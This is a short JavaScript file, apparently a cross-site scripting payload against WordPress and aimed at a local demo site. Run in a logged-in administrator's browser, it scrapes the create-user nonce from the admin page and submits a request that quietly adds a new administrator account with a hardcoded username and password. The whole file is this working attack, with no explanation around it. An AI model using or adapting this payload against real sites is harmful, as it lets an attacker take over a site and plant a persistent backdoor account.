var USERNAME = "foobar";
var PASSWORD = "1GaRZAdAr8dm4YOJ6f9IdaISb1v7TRXv";
var BASEURL = "http://wpdemo.local:7777";

function extractNonce() {
	return fetch(`${BASEURL}/wp-admin/user-new.php`, { credentials: "include" })
		.then((res) => res.text())
		.then((text) => {
			const parser = new DOMParser();
			const doc = parser.parseFromString(text, "text/html");
			return doc.getElementById("_wpnonce_create-user")?.value;
		})
		.catch((e) => e);
}
function createAdmin(username, password, nonce) {
	return fetch(`${BASEURL}/wp-admin/user-new.php`, {
		method: "POST",
		credentials: "include",
		headers: {
			"Content-Type": "application/x-www-form-urlencoded",
			Referer: `${BASEURL}/wp-admin/user-new.php`,
		},
		body: new URLSearchParams({
			action: "createuser",
			"_wpnonce_create-user": nonce,
			_wp_http_referer: "/wp-admin/user-new.php",
			user_login: username,
			email: `${username}@example.org`,
			first_name: "",
			last_name: "",
			url: "",
			pass1: password,
			pass2: password,
			pw_weak: "on",
			role: "administrator",
			createuser: "Add New User",
		}),
	});
}
extractNonce()
	.then((nonce) => createAdmin(USERNAME, PASSWORD, nonce))
	.catch((e) => {
		console.error(e);
	});
